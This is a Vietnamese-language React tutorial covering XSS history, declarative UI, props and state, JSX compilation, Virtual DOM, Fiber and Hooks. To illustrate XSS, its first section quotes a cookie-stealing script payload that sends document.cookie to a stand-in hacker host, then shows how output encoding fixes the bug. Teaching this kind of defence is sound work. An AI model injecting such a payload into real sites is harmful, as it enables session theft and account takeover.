# React Base — Từ Bản Chất Đến Thực Hành

> Tài liệu này được viết lại với mục tiêu: người mới học React không chỉ biết "gõ code chạy được", mà hiểu **vì sao** React được thiết kế như vậy, và có thể tự kiểm chứng bằng tool thật thay vì học vẹt lý thuyết.

---

## 1. Bối Cảnh: Vì Sao React Ra Đời

### 1.1. Thời kỳ Server-Side Rendering thuần túy

Trước khi có các thư viện như React, cách phổ biến nhất để tạo trang web là: server nhận request, xử lý dữ liệu, rồi **ghép chuỗi** để tạo ra HTML gửi thẳng về trình duyệt. Ví dụ với PHP:

```php
<?php
$username = $_GET['name']; // dữ liệu từ người dùng
echo "<h1>Chào mừng, " . $username . "!</h1>";
?>
```

Cách này rất dễ tiếp cận — chỉ cần biết ghép chuỗi là làm được web. Nhưng nó mang theo một lỗ hổng bảo mật nghiêm trọng gọi là **XSS (Cross-Site Scripting)**.

**Ví dụ cụ thể:** nếu người dùng nhập vào ô "tên" (hoặc URL) đoạn:

```
<script>fetch('https://hacker.com/steal?cookie=' + document.cookie)</script>
```

thì HTML server trả về sẽ chứa nguyên văn đoạn script đó. Trình duyệt của **bất kỳ ai xem trang này** (ví dụ trang hồ sơ công khai, trang bình luận) sẽ tự động thực thi đoạn mã, gửi cookie đăng nhập của họ cho hacker — dẫn tới chiếm quyền tài khoản. Nguyên nhân gốc: **dữ liệu người dùng (chỉ nên là text) bị trộn lẫn với mã thực thi được (HTML/JS)** mà không qua bước làm sạch (sanitize/escape).

Giải pháp ban đầu là escape thủ công (biến `<` thành `&lt;`, `>` thành `&gt;`...), nhưng đây là việc dễ quên, dễ sai — một dòng code thiếu escape ở đâu đó trong hệ thống lớn là đủ để mở lỗ hổng.

#### Nhìn từng bước: dữ liệu biến thành mã thực thi như thế nào?

Điểm nguy hiểm không nằm ở PHP hay SSR. Lỗi xuất hiện khi ứng dụng đặt một giá trị **không đáng tin cậy** vào HTML mà không mã hóa đúng ngữ cảnh. Hãy lần theo đúng request `?name=...`:

1. Trình duyệt gửi giá trị `name` do người dùng kiểm soát lên server.
2. PHP nối thẳng giá trị đó vào chuỗi `<h1>Chào mừng, ...!</h1>`.
3. Server trả chuỗi kết quả với header `Content-Type: text/html`.
4. Trình duyệt **parse** chuỗi như HTML. Vì `<script>` hoặc một event handler được hiểu là mã, nó có thể chạy với quyền của chính website đang bị lỗi.

**Phân biệt hai tình huống thường gặp:** với reflected XSS, payload nằm trong URL và chạy khi nạn nhân mở chính đường link đã được tạo sẵn. Với stored XSS, payload được lưu vào database như một bình luận hoặc tên hồ sơ; khi đó bất kỳ ai mở trang chứa dữ liệu đã lưu đều có thể bị ảnh hưởng.

> Demo bên dưới dùng payload vô hại: nó chỉ đổi nội dung một ô trong trang để chứng minh JavaScript đã được trình duyệt diễn giải. Demo không đọc cookie, không gửi request và không thực thi nội dung tùy ý từ người học.

#### Sửa đúng ở phía PHP

Nếu dữ liệu chỉ cần xuất hiện như **text trong HTML**, hãy encode ngay tại output:

```php
<?php
$username = $_GET['name'] ?? '';
$safeUsername = htmlspecialchars(
    $username,
    ENT_QUOTES | ENT_SUBSTITUTE,
    'UTF-8'
);
echo "<h1>Chào mừng, " . $safeUsername . "!</h1>";
?>
```

Ví dụ `<script>` lúc này trở thành `&lt;script&gt;`. Trình duyệt hiển thị nó như chữ, thay vì tạo một phần tử script. Đây là **output encoding**, khác với sanitize: encoding dùng khi dữ liệu phải là text; sanitize chỉ cần khi sản phẩm thật sự cho phép người dùng nhập một tập HTML giới hạn.

Trong React, `{username}` cũng được escape mặc định. Tuy nhiên, lớp bảo vệ này bị bỏ qua nếu dùng `dangerouslySetInnerHTML`, thao tác `innerHTML` trực tiếp, hoặc đặt dữ liệu vào ngữ cảnh khác như URL mà không kiểm tra. Cookie `HttpOnly` và Content Security Policy là các lớp phòng thủ bổ sung; chúng giảm hậu quả nhưng không thay thế việc encode đúng đầu ra.

### 1.2. Vấn đề hiệu năng khi ứng dụng trở nên tương tác cao

Giả sử bạn có một danh sách chat 1000 tin nhắn. Có 1 tin nhắn mới đến, cách làm truyền thống (jQuery-style) thường là:

```javascript
function renderChat(messages) {
  let html = "<div class='chat'>";
  for (const msg of messages) {
    html += `<div class='message'>${escapeHtml(msg.text)}</div>`;
  }
  html += "</div>";
  document.getElementById("chat-box").innerHTML = html; // GHI ĐÈ TOÀN BỘ
}

messages.push(newMessage);
renderChat(messages); // render lại cả 1000 tin nhắn cũ + 1 tin mới
```

Vấn đề: dù chỉ có 1 phần tử mới, trình duyệt phải xóa sạch toàn bộ DOM cũ, dựng lại 1000 phần tử từ đầu, tính lại layout, vẽ lại (repaint) toàn màn hình. Với ứng dụng cập nhật liên tục (chat, dashboard theo dõi real-time, bảng giá chứng khoán...), việc này lặp lại hàng chục lần mỗi giây khiến trình duyệt ì ạch.

### 1.3. Vấn đề tổ chức mã nguồn: ràng buộc chồng chéo

Ngoài bảo mật và hiệu năng, cách quản lý dữ liệu-giao diện kiểu cũ (thao tác DOM trực tiếp, không có mô hình rõ ràng) khiến một thay đổi dữ liệu nhỏ có thể kéo theo hiệu ứng dây chuyền khó lường: bạn sửa một biến ở đâu đó, quên cập nhật một chỗ hiển thị liên quan, giao diện hiển thị sai mà không có lỗi nào báo ra — vì không có cơ chế nào đảm bảo "UI luôn khớp với data".

### 1.4. Giải pháp cốt lõi: mô phỏng giao diện trong bộ nhớ

React (và các framework cùng thời) giải quyết đồng thời 3 vấn đề trên bằng một ý tưởng: **thay vì thao tác trực tiếp lên DOM thật, hãy tạo ra một bản mô phỏng giao diện (Virtual DOM) trong bộ nhớ JavaScript.** Khi dữ liệu đổi, hệ thống chỉ cần tính toán **phần khác biệt** rồi áp đúng phần đó lên DOM thật — vừa nhanh hơn, vừa tránh chèn HTML thô (giải quyết luôn vấn đề XSS ở tầng framework), vừa buộc code phải theo một mô hình rõ ràng (UI luôn là hàm của state) nên dễ bảo trì hơn.

Ba động lực này — **bảo mật, hiệu năng, khả năng bảo trì** — chính là ba trụ cột giải thích cho gần như mọi quyết định thiết kế của React mà bạn sẽ thấy xuyên suốt tài liệu này.

---

## 2. Triết Lý Thiết Kế Của React

React không chỉ là một thư viện, nó là một **cách tư duy**. Ba trụ cột: Declarative Programming, Component-based Architecture, One-way Data Flow.

### 2.1. Lập trình khai báo (Declarative) vs lập trình chỉ thị (Imperative)

**Imperative — "làm sao" (HOW):** bạn ra lệnh từng bước cho trình duyệt.

```html
<div>
  <p id="count">0</p>
  <button id="btn">Increase</button>
</div>

<script>
  let count = 0;
  const countEl = document.getElementById("count");
  const btn = document.getElementById("btn");

  btn.addEventListener("click", () => {
    count++;                                              // 1. đổi data
    countEl.innerText = count;                             // 2. tự tay cập nhật text
    countEl.style.color = count % 2 === 0 ? "red" : "blue"; // 3. tự tay cập nhật màu
  });
</script>
```

Bạn phải nhớ: mỗi khi `count` đổi, phải tự đi cập nhật **từng chỗ** liên quan (text, màu...). Với 3 dòng thì không sao, nhưng với hàng trăm chỗ hiển thị liên quan đến `count` trên một trang phức tạp, việc "nhớ hết những nơi cần cập nhật" gần như bất khả thi — chỉ cần quên 1 chỗ là UI hiển thị sai mà không có gì báo lỗi.

**Declarative — "muốn cái gì" (WHAT):** bạn chỉ mô tả UI *phải trông như thế nào* ứng với một state, còn việc "làm sao để đạt được điều đó" là việc của React.

```jsx
import { useState } from "react";

function Counter() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <p style={{ color: count % 2 === 0 ? "red" : "blue" }}>
        {count}
      </p>
      <button onClick={() => setCount(count + 1)}>
        Increase
      </button>
    </div>
  );
}

export default Counter;
```

Công thức cốt lõi: **`UI = f(state)`**. Bạn không viết "khi count đổi thì làm A, B, C" — bạn chỉ viết "với count này thì UI trông như vậy", và React tự đảm bảo đồng bộ. Đây là lý do bạn *không thấy* dòng nào kiểu `countEl.innerText = ...` trong code React — bởi vì bạn không cần viết nó, JSX ở dòng `<p>{count}</p>` **chính là** lời khai báo "UI phải hiển thị đúng giá trị count hiện tại", còn việc cập nhật DOM thật khi count đổi là trách nhiệm của React (thông qua Virtual DOM — phần 4).

> **Cách tự kiểm chứng:** mở 2 đoạn code trên trong 2 tab CodeSandbox/JSFiddle, đặt `console.log` ở mọi chỗ đổi DOM. Với bản imperative, bạn sẽ thấy chính tay mình gọi `countEl.innerText =` và `countEl.style.color =`. Với bản React, bạn sẽ không tìm thấy dòng nào tương tự trong code bạn viết — nhưng nếu mở DevTools tab Elements và click nút, bạn vẫn thấy DOM thay đổi. Đó là bằng chứng React đang tự làm phần "how" phía sau.

### 2.2. Kiến trúc dựa trên Component (Component-Based Architecture)

Tư duy đầu tiên khi xây UI bằng React là **phá vỡ giao diện tổng thể thành các mảnh nhỏ, độc lập, tái sử dụng được** — gọi là component. Thay vì viết một trang web nguyên khối, bạn xây từng mảnh: một nút bấm, một thanh điều hướng, một thẻ hồ sơ — rồi ghép lại.

**Nguyên tắc Single Responsibility cho component:** mỗi component chỉ nên làm một việc rõ ràng. Ví dụ, một component `UserProfile` đang phải xử lý cả việc fetch dữ liệu, hiển thị avatar, xử lý form đổi mật khẩu, và hiển thị danh sách bạn bè — đó là dấu hiệu cần tách thành 4 component nhỏ hơn: `useUserData` (logic), `Avatar`, `PasswordForm`, `FriendList`.

**React ưu tiên Composition hơn Inheritance.** Thay vì tạo cây phân cấp kế thừa phức tạp kiểu OOP (`class SpecialButton extends Button extends BaseComponent`), React khuyến khích bạn tạo các component đơn giản rồi **lồng ghép (compose)** chúng lại:

```jsx
// Thay vì kế thừa, ta "ghép" component qua children hoặc props
function Card({ children }) {
  return <div className="card">{children}</div>;
}

function UserCard({ user }) {
  return (
    <Card>
      <Avatar src={user.avatar} />
      <h3>{user.name}</h3>
    </Card>
  );
}
```

`UserCard` không "kế thừa" `Card` — nó chỉ dùng `Card` như một khối xây dựng, truyền nội dung riêng vào qua `children`. Cách này linh hoạt hơn nhiều: bạn có thể lồng bất kỳ nội dung nào vào `Card` mà không cần tạo lớp con mới.

### 2.3. State và Props — phân biệt rạch ròi

Đây là 2 khái niệm người mới hay nhầm lẫn nhất, nên cần một bảng so sánh rõ ràng:

| Tiêu chí | State | Props |
|---|---|---|
| Ai sở hữu | Component tự quản lý (nội bộ) | Được truyền từ component cha |
| Có thể thay đổi trong component không | Có (`setState`) | Không (read-only) |
| Ví dụ | Nội dung ô input đang gõ, trạng thái menu mở/đóng | `user`, `title`, `onClick` được cha truyền xuống |
| Ai chịu trách nhiệm khi cần đổi giá trị | Chính component đó | Component **cha** (component con chỉ có thể "xin" qua callback) |

```jsx
import { useState } from "react";

function Parent() {
  const [count, setCount] = useState(0); // Parent SỞ HỮU state này

  return (
    <div>
      <h2>Parent count: {count}</h2>
      <Child count={count} /> {/* truyền xuống qua props */}
      <button onClick={() => setCount(count + 1)}>Increase</button>
    </div>
  );
}

function Child({ count }) {
  // Child KHÔNG được viết: count = 5; → sẽ lỗi hoặc bị React cảnh báo
  return <p>Child nhận props: {count}</p>;
}

export default Parent;
```

**Thử nghiệm để hiểu rõ tại sao props là read-only:** nếu bạn cố tình viết `count = count + 1;` bên trong `Child`, React sẽ không báo lỗi runtime ngay (vì JS cho phép gán lại biến cục bộ), nhưng lần render tiếp theo giá trị đó sẽ **bị Parent ghi đè lại** — vì props luôn được đồng bộ lại từ component cha ở mỗi lần render. Đây là minh chứng thực tế cho việc "props chỉ đọc": bạn *có thể* gán tạm, nhưng nó không có ý nghĩa gì, vì nguồn sự thật (source of truth) nằm ở Parent, không nằm ở Child.

### 2.4. Luồng dữ liệu một chiều (One-way Data Flow)

Nguyên tắc: **dữ liệu luôn chảy từ cha xuống con qua props.** Khi con cần "yêu cầu" thay đổi dữ liệu, nó không tự sửa — nó gọi một **callback function** mà cha truyền xuống, để cha là người quyết định cập nhật state.

```jsx
function Parent() {
  const [count, setCount] = useState(0);

  return (
    <div>
      <h1>Count: {count}</h1>
      <Child onIncrease={() => setCount(count + 1)} />
    </div>
  );
}

function Child({ onIncrease }) {
  // Child hoàn toàn không biết giá trị count là bao nhiêu,
  // nó chỉ biết "khi được click, gọi hàm onIncrease"
  return <button onClick={onIncrease}>Tăng</button>;
}
```

**Ví dụ minh họa "vì sao một chiều lại dễ debug hơn hai chiều":** hãy tưởng tượng nếu React cho phép data flow 2 chiều tự do (child có thể tự sửa state của parent trực tiếp, giống binding 2 chiều kiểu Angular cũ/Vue v2). Khi bug xảy ra ("tại sao count lại là 7 mà không phải 5?"), bạn phải lần theo **mọi nơi** có thể sửa `count` — có thể là 5 component khác nhau ở 5 chỗ trong cây UI. Với one-way data flow, chỉ có **đúng một nơi** sở hữu và sửa `count` (nơi gọi `setCount`), nên khi debug bạn chỉ cần tìm đúng 1 điểm — đây gọi là **single source of truth**.

> **Bài tập tự kiểm chứng:** thử code lại ví dụ Counter, nhưng cố tình để `Child` nhận nguyên object `{ count, setCount }` và tự gọi `setCount(999)` bên trong Child. Kỹ thuật này *chạy được* (không phải React cấm), nhưng nó phá vỡ nguyên tắc one-way — và bạn sẽ thấy code khó theo dõi hơn hẳn khi ứng dụng có thêm vài component nữa cùng thao túng `count`. Đây là lý do dù React không ép buộc bằng công cụ, cộng đồng vẫn coi one-way data flow là quy ước bắt buộc.
## 3. Bản Chất Của JSX Và Quá Trình Biên Dịch

### 3.1. Trình duyệt không hề biết JSX là gì

JSX (JavaScript XML) cho phép viết `<div>`, `<h1>` trực tiếp trong JavaScript, tạo cảm giác rất thân thiện với người mới. Nhưng cần hiểu rõ: **trình duyệt chỉ hiểu HTML, CSS, và JavaScript chuẩn — nó không biết JSX là gì.** JSX chỉ là "đường cú pháp" (syntactic sugar), bắt buộc phải qua một bước **biên dịch (transform)** để trở thành JS thuần trước khi chạy được.

**Cách tự kiểm chứng ngay lập tức:** mở DevTools Console trên bất kỳ trang thuần HTML nào (không có React), gõ:
```javascript
document.write("<h1>Hello</h1>");
```
→ chạy bình thường, vì đây là chuỗi HTML. Nhưng nếu gõ:
```javascript
const x = <h1>Hello</h1>;
```
→ báo `SyntaxError` ngay lập tức. Đây là bằng chứng trực tiếp rằng JS engine của trình duyệt (V8, SpiderMonkey...) không parse được cú pháp `<h1>` nằm giữa biểu thức JS — nó cần Babel dịch trước.

### 3.2. Công cụ biên dịch: Babel

Công cụ phổ biến nhất là **Babel**, qua plugin `@babel/plugin-transform-react-jsx`. Có 2 kiểu biên dịch, tương ứng với 2 giai đoạn lịch sử của React.

**Classic Runtime (React ≤ 16):** mọi JSX được dịch thành lời gọi `React.createElement()`.

```jsx
// Bạn viết:
const element = <h1 className="greeting">Hello, World!</h1>;
```
dịch thành:
```javascript
const element = React.createElement(
  'h1',                        // type: tên thẻ hoặc Component
  { className: 'greeting' },   // props
  'Hello, World!'              // children
);
```

Vì mọi JSX đều ngầm gọi `React.createElement`, nên ở phiên bản cũ **bắt buộc** phải có `import React from 'react';` ở đầu mỗi file — kể cả khi bạn không gõ chữ `React` ở bất kỳ đâu trong code. Lý do: dòng import đó không phải để bạn dùng, mà để biến `React` tồn tại trong scope cho đoạn code Babel *tự sinh ra* phía sau lưng bạn.

**Automatic Runtime (từ React 17):** Babel tự chèn import ẩn và gọi hàm `_jsx` thay vì `React.createElement`:

```javascript
// Babel tự thêm dòng này — bạn không cần viết
import { jsx as _jsx } from 'react/jsx-runtime';

function App() {
  return _jsx('h1', { children: 'Hello world' });
}
```

Đây là lý do các dự án React hiện đại (Next.js, Vite + React) không còn cần `import React` thủ công nữa.

### 3.3. Thực hành: tự xem quá trình biên dịch

Có 4 cách để "mắt thấy tay sờ" được quá trình này thay vì chỉ tin vào lý thuyết:

**Cách 1 — Babel REPL (nhanh nhất):** vào `babeljs.io/repl`, dán JSX vào ô trái. Ở sidebar, tick preset **react**, chọn **React Runtime: Classic** hoặc **Automatic** để so sánh 2 kiểu output ở trên.

**Cách 2 — Babel CLI trên máy thật:**
```bash
npm install --save-dev @babel/core @babel/cli @babel/preset-react
```
Tạo `.babelrc`:
```json
{ "presets": ["@babel/preset-react"] }
```
Chạy:
```bash
npx babel test.jsx --out-file test-compiled.js
```
Mở file `test-compiled.js` — đây chính xác là code trình duyệt thực sự nhận được.

**Cách 3 — DevTools Sources tab:** với project chạy bằng Vite/CRA, mở F12 → tab **Sources**, tìm file `.jsx` gốc (qua sourcemap) và toggle để xem bản đã biên dịch song song với bản gốc.

**Cách 4 — console.log trực tiếp object JSX:** đây là cách nhanh nhất để kiểm chứng phần 3.4 dưới đây.

### 3.4. JSX không tạo ra HTML — nó tạo ra một object JavaScript

Dù biên dịch kiểu nào, kết quả cuối cùng luôn chỉ là **một object JS thuần**, mô tả giao diện chứ không phải HTML thật:

```jsx
<h1>Hello</h1>
```
tương đương với object:
```javascript
{
  type: 'h1',
  props: {
    children: 'Hello'
  }
}
```

**Kiểm chứng ngay trong project React:**
```jsx
const element = <h1 className="greeting">Hello, World!</h1>;
console.log(element);
```
Mở Console, bạn sẽ thấy đúng object này hiện ra — không phải chuỗi HTML `"<h1 class=..."`, mà là object JS với `type`, `props`.

### 3.5. `$$typeof: Symbol(react.element)` — "con dấu" chống giả mạo

Object JSX không phải object "bình thường hoàn toàn" — React tự gắn thêm một thuộc tính:
```javascript
$$typeof: Symbol.for('react.element')
```

Đây đóng vai trò như "con dấu xác thực": React dựa vào nó để biết object này thực sự do chính React sinh ra (qua `createElement`/`_jsx`), không phải object ngẫu nhiên hay giả mạo.

**Vì sao Symbol lại có tác dụng chống giả mạo:** `Symbol` trong JavaScript là kiểu dữ liệu **duy nhất tuyệt đối** — không thể serialize qua JSON, không thể tạo lại giống hệt từ bên ngoài. Nếu server trả về dữ liệu JSON có dạng:
```json
{ "type": "h1", "props": { "children": "Hacked" } }
```
object này **thiếu** `$$typeof: Symbol.for('react.element')` (vì Symbol không đi qua JSON được), nên khi React duyệt cây để render, nó sẽ nhận ra đây không phải element hợp lệ và từ chối xử lý như UI thật.

**Lưu ý quan trọng — đây KHÔNG phải cơ chế chống XSS:** `$$typeof` chỉ giúp React phân biệt "đúng element React" và "object lạ", không liên quan đến việc escape nội dung. Việc chống XSS thực sự đến từ hành vi mặc định của React: **tự động escape mọi nội dung khi render**.

```jsx
const userInput = "<script>alert('hacked')</script>";
return <div>{userInput}</div>;
```
React sẽ hiển thị đúng nguyên văn chuỗi này như **text**, không biến thành thẻ `<script>` thực thi được — an toàn theo mặc định, đúng như mục tiêu ban đầu ở phần 1.1.

Chỉ khi bạn **chủ động bypass** bằng:
```jsx
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```
thì React mới chèn thẳng chuỗi vào DOM như HTML thật — và lỗ hổng XSS y hệt thời kỳ ghép chuỗi HTML server-side có thể quay lại, vì bạn đã tự tay tắt lớp bảo vệ mặc định. Chỉ dùng API này khi bạn hoàn toàn chắc chắn nội dung đã được sanitize (ví dụ qua thư viện như DOMPurify).

---

## 4. Công Nghệ Điều Phối Hiệu Năng: Virtual DOM và Reconciliation

### 4.1. Vì sao thao tác trực tiếp lên Real DOM lại đắt đỏ

Nếu bạn đổi màu một nút bấm bằng thao tác DOM trực tiếp trên quy mô lớn (hàng trăm phần tử), trình duyệt có thể phải tính lại **layout** (kích thước, vị trí của các phần tử xung quanh — gọi là reflow) và **repaint** (vẽ lại pixel) toàn bộ vùng ảnh hưởng. Đây là những thao tác tốn tài nguyên CPU/GPU thực sự, không phải "cảm giác chậm" mơ hồ.

**Ví dụ đo lường cụ thể (bạn có thể tự thử trong DevTools tab Performance):** tạo 1000 `<div>` trong một trang, rồi trong vòng lặp, đổi `style.color` từng phần tử một cách trực tiếp. Ghi lại thời gian bằng `performance.now()` trước và sau vòng lặp — bạn sẽ thấy con số vài chục đến vài trăm mili-giây tùy máy, đủ để gây giật lag nếu lặp lại 60 lần/giây (tương đương animate mượt).

### 4.2. Cơ chế Virtual DOM — 4 giai đoạn

Virtual DOM (VDOM) là một cây object JS mô phỏng lại cấu trúc DOM thật, tồn tại hoàn toàn **trong bộ nhớ JavaScript** (không chạm trình duyệt). Quá trình đồng bộ, gọi là **Reconciliation**, gồm 4 bước:

1. **First Paint:** khi app khởi chạy, React dựng cây VDOM đầu tiên và xuất ra DOM thật tương ứng — đây là lần duy nhất "toàn bộ" được vẽ.
2. **Trigger & Re-render:** khi state đổi (ví dụ `setCount`), hàm component chứa state đó chạy lại. Bước này **chưa chạm** DOM trình duyệt — React chỉ âm thầm tính ra một cây VDOM mới trong bộ nhớ.
3. **Diffing:** React đặt cây VDOM mới cạnh cây VDOM cũ, so sánh để tìm ra chính xác điểm khác biệt.
4. **Commit:** React đóng gói các khác biệt tìm được thành một "bản vá" (patch) tối thiểu, rồi áp trực tiếp đúng phần đó lên DOM thật. Phần còn lại của trang **không hề bị động tới**.

**Ví dụ cụ thể để thấy sự khác biệt:** giả sử bạn có danh sách 1000 tin nhắn (giống ví dụ ở phần 1.2), và chỉ 1 tin nhắn mới được thêm vào cuối mảng `messages`. Với React:

```jsx
function ChatList({ messages }) {
  return (
    <div>
      {messages.map(msg => <div key={msg.id}>{msg.text}</div>)}
    </div>
  );
}
```

Khi `messages` có thêm 1 phần tử, component chạy lại (bước 2), tạo ra cây VDOM mới có 1001 node. Ở bước Diffing, React so sánh và nhận ra 1000 node đầu **giống hệt** node cũ (cùng `key`, cùng nội dung) — chỉ có 1 node cuối là mới. Ở bước Commit, React chỉ tạo **đúng 1 DOM node mới** và chèn vào cuối danh sách thật — 1000 node còn lại của DOM thật hoàn toàn không bị đụng tới, không reflow, không repaint lại.

### 4.3. Thuật toán Diffing: Heuristic O(n) thay vì O(n³)

So sánh 2 cây tổng quát trong khoa học máy tính có độ phức tạp lý thuyết lên tới O(n³) — không thể chấp nhận với UI có hàng nghìn node. React chọn cách thực dụng hơn: dùng **2 giả định heuristic** để đưa bài toán về gần O(n).

**Giả định 1 — khác loại (type) thì coi như khác hoàn toàn cây con:**

```jsx
// Render lần 1:
<div><Counter /></div>

// Render lần 2 (đổi div thành span):
<span><Counter /></span>
```

Vì `div` khác `span`, React **không** cố so sánh sâu bên trong — nó hủy toàn bộ subtree cũ (bao gồm cả `Counter`, mất luôn state của `Counter`) và dựng subtree mới hoàn toàn. Đây là lý do đổi loại phần tử gốc của một cây con là thao tác "đắt" — nó không tận dụng được diff thông minh.

**Giả định 2 — `key` trong danh sách để nhận diện danh tính:**

```jsx
// KHÔNG NÊN — dùng index làm key
{items.map((item, index) => <Item key={index} data={item} />)}

// NÊN — dùng id ổn định
{items.map(item => <Item key={item.id} data={item} />)}
```

**Ví dụ minh họa cụ thể vì sao dùng `index` là sai:** giả sử danh sách ban đầu là `[A, B, C]` (index 0,1,2), sau đó bạn **xóa A**, còn lại `[B, C]`. Nếu dùng `index` làm key: phần tử ở vị trí 0 trước đó là A (key=0), giờ là B (key=0) — React thấy "key=0 vẫn còn, nội dung đổi từ A thành B" nên nó **cập nhật nội dung** của DOM node cũ thay vì hiểu đúng bản chất là "A bị xóa, B và C dịch lên". Hậu quả: nếu mỗi `Item` có state nội bộ (ví dụ ô input đang gõ dở), state đó sẽ bị "dính" sai vào nhầm item sau khi xóa — một lỗi rất khó phát hiện vì UI trông vẫn "đúng" ở cái nhìn đầu tiên.

Nếu dùng `key={item.id}` (id ổn định không đổi theo vị trí), React nhận diện chính xác: "A biến mất, B và C giữ nguyên danh tính, chỉ đổi vị trí" — xóa đúng 1 DOM node của A, giữ nguyên state của B và C.

### 4.4. Từ Stack Reconciler đến React Fiber

**Trước React 16 — Stack Reconciler:** duyệt cây VDOM bằng đệ quy dựa trên call stack của JS, chạy **đồng bộ hoàn toàn** — một khi bắt đầu render, không thể dừng giữa chừng. Nếu cây UI đủ lớn, main thread bị chiếm dụng liên tục trong lúc render, khiến scroll/click/animation bị giật hoặc treo.

**Từ React 16 — React Fiber:** viết lại toàn bộ cơ chế reconciliation để có thể **chia nhỏ công việc** và **tạm dừng/tiếp tục** render.

| Tiêu chí | Stack Reconciler (< 16) | Fiber Reconciler (16+) |
|---|---|---|
| Cách duyệt cây | Đệ quy theo call stack | Cấu trúc Fiber Node liên kết cha–con–anh em |
| Mô hình thực thi | Đồng bộ hoàn toàn | Chia nhỏ thành nhiều bước (incremental) |
| Có thể dừng giữa chừng | Không | Có (pause / resume / hủy) |
| Ảnh hưởng main thread | Dễ block khi xử lý lớn | Giảm block nhờ xen kẽ công việc |
| Ưu tiên cập nhật | Gần như không có | Có thể gán priority cho từng update |
| Nền tảng cho | — | Concurrent Rendering |

Mỗi node trong Fiber là một **Fiber Node** — object JS chứa `tag`, `key`, props, state, cùng con trỏ tới node cha/con/anh em. Nhờ cấu trúc liên kết này (thay vì phụ thuộc call stack), React có thể dừng việc duyệt tại bất kỳ node nào, nhường main thread cho việc xử lý tương tác người dùng (ưu tiên cao hơn), rồi quay lại tiếp tục render sau — cơ chế này gọi là **time slicing**, nền tảng cho Concurrent Rendering ở các bản React mới.
## 5. Vòng Đời Component Và Sự Ra Đời Của Hooks

### 5.1. Ba giai đoạn vòng đời

Mỗi component từ lúc xuất hiện đến lúc bị gỡ bỏ đều trải qua 3 giai đoạn:

- **Mounting (khởi tạo):** component lần đầu được thêm vào DOM.
- **Updating (cập nhật):** component render lại do state/props đổi.
- **Unmounting (hủy bỏ):** component bị gỡ khỏi DOM.

### 5.2. Vì sao Class Component bộc lộ hạn chế

Trước Hooks, chỉ Class Component mới quản lý được state và vòng đời, thông qua các lifecycle method:

```jsx
class WindowWidthLogger extends React.Component {
  componentDidMount() {
    // chạy sau lần render đầu tiên — nơi "đăng ký" sự kiện
    window.addEventListener('resize', this.handleResize);
  }

  componentWillUnmount() {
    // chạy trước khi component bị hủy — nơi "dọn dẹp"
    window.removeEventListener('resize', this.handleResize);
  }

  handleResize = () => { /* ... */ };

  render() {
    return <div>...</div>;
  }
}
```

**Vấn đề cụ thể:** logic "đăng ký sự kiện resize" và logic "hủy đăng ký" **liên quan chặt chẽ với nhau** (cùng nói về 1 sự kiện), nhưng lại bị **tách rời** thành 2 lifecycle method nằm cách xa nhau trong file. Nếu component có 3 side effect khác nhau (resize listener, fetch API, subscribe websocket), code đăng ký của cả 3 sẽ bị trộn chung trong `componentDidMount`, và code dọn dẹp của cả 3 cũng bị trộn chung trong `componentWillUnmount` — rất dễ quên dọn nhầm hoặc thiếu dọn khi code phình to. Thêm vào đó, `this` trong JavaScript có ngữ cảnh (context) dễ gây lỗi (ví dụ quên `.bind(this)` hoặc quên dùng arrow function) — một nguồn bug rất phổ biến với người mới.

### 5.3. Hooks (React 16.8): gom logic theo tính năng, không theo vòng đời

Hooks cho phép Function Component quản lý state/lifecycle mà không cần class. Quan trọng hơn, nó cho phép **gom toàn bộ logic của một tính năng vào một chỗ**, thay vì rải theo lifecycle method:

```jsx
function WindowWidthLogger() {
  useEffect(() => {
    const handleResize = () => { /* ... */ };
    window.addEventListener('resize', handleResize); // đăng ký

    return () => {
      window.removeEventListener('resize', handleResize); // dọn dẹp
    };
    // Cả "đăng ký" và "dọn dẹp" nằm CHUNG một khối — dễ đọc, dễ đối chiếu
  }, []);

  return <div>...</div>;
}
```

**Custom Hooks** — điểm mạnh lớn nhất của Hooks — cho phép đóng gói một luồng xử lý hoàn chỉnh thành hàm riêng, tái sử dụng ở nhiều component.

**Trường hợp CHƯA custom — logic bị lặp lại ở từng component:**

Giả sử bạn cần biết chiều rộng cửa sổ ở cả `Sidebar` lẫn `Header` (2 component khác nhau, không liên quan gì đến nhau trong cây UI). Không có custom hook, bạn buộc phải copy-paste **y hệt** đoạn `useState` + `useEffect` vào từng nơi:

```jsx
function Sidebar() {
  const [width, setWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  return <div>Sidebar rộng: {width}px</div>;
}

function Header() {
  // Y HỆT đoạn code ở Sidebar — chỉ copy-paste lại
  const [width, setWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  return <div>Header rộng: {width}px</div>;
}
```

**Vấn đề cụ thể của cách làm này:**

1. **Trùng lặp code:** cùng một logic (`addEventListener`, `removeEventListener`, `useState`) bị viết lại y hệt ở mọi nơi cần dùng. Có 5 component cần biết `width` thì có 5 bản copy giống hệt nhau.
2. **Khó sửa đồng bộ:** nếu sau này bạn muốn đổi logic (ví dụ thêm debounce để tránh gọi `setWidth` quá dày khi resize liên tục), bạn phải nhớ sửa **ở tất cả các nơi** đã copy-paste. Quên sửa 1 chỗ là chỗ đó lỗi thời so với các chỗ còn lại — một nguồn bug rất phổ biến trong dự án thực tế khi code được copy qua nhiều file theo thời gian.
3. **Test khó hơn:** logic bị dính chặt vào từng component, muốn viết unit test riêng cho "logic theo dõi chiều rộng cửa sổ" thì phải test gián tiếp qua UI của `Sidebar` hoặc `Header`, thay vì test độc lập logic đó.

**Sau khi custom hóa — logic viết một lần, dùng lại nhiều nơi:**

```jsx
function useWindowWidth() {
  const [width, setWidth] = useState(window.innerWidth);

  useEffect(() => {
    const handleResize = () => setWidth(window.innerWidth);
    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  return width;
}

// Dùng lại ở bất kỳ component nào, không cần copy-paste logic:
function Sidebar() {
  const width = useWindowWidth();
  return <div>Sidebar rộng: {width}px</div>;
}

function Header() {
  const width = useWindowWidth(); // gọi lại đúng logic, không copy code
  return <div>Header rộng: {width}px</div>;
}
```

